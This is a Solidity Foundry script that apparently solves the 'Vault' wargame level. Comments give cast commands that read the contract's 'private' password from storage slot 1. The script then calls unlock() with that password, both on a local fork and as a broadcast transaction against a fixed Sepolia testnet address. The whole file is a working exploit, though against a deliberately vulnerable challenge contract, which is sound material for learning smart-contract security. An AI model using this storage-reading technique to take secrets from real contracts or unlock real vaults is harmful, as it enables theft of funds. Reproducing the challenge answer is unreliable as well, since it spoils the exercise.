// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}

// $ forge script script/VaultExp.s.sol:ForkExp
// $ forge script script/VaultExp.s.sol:ForkExp --fork-url $SEPOLIA_RPC_URL -vvvvv
contract ForkExp is Script {
    IVault public contractInstance;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    bytes32 password = bytes32("password"); // The password to unlock the vault

    function run() external {
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 10 ether);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IVault(address(new Vault(password)));
            vm.stopPrank();
        } else if (chainId == 11155111) {
            password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
            contractInstance = IVault(payable(0x5ec06906FfE4e5c3657dE4e9F33542Ba076726a4));
        } else {
            return;
        }
        console2.logString("password is ");
        console2.logBytes(abi.encodePacked(password));

        vm.startPrank(attacker);
        contractInstance.unlock(password); // Call the unlock function with the password

        bool isLocked = contractInstance.locked(); // Check if the vault is still locked
        require(isLocked == false, "still locked!!!");
        vm.stopPrank();
    }
}

// $ forge script script/VaultExp.s.sol:onChainExp --fork-url $SEPOLIA_RPC_URL -vvvvv
// $ forge script script/VaultExp.s.sol:onChainExp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
// $ make vaultExp ARGS='--network sepolia'
// cast storage 0x5ec06906FfE4e5c3657dE4e9F33542Ba076726a4 1 --rpc-url $SEPOLIA_RPC_URL //password
// cast storage 0x5ec06906FfE4e5c3657dE4e9F33542Ba076726a4 0 --rpc-url $SEPOLIA_RPC_URL //locked
contract onChainExp is Script {
    IVault public contractInstance = IVault(0x5ec06906FfE4e5c3657dE4e9F33542Ba076726a4);
    bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;

    function run() external {
        vm.startBroadcast();
        contractInstance.unlock(password);
        bool isLocked = contractInstance.locked();
        require(isLocked == false, "still locked!!!");
        vm.stopBroadcast();
    }
}
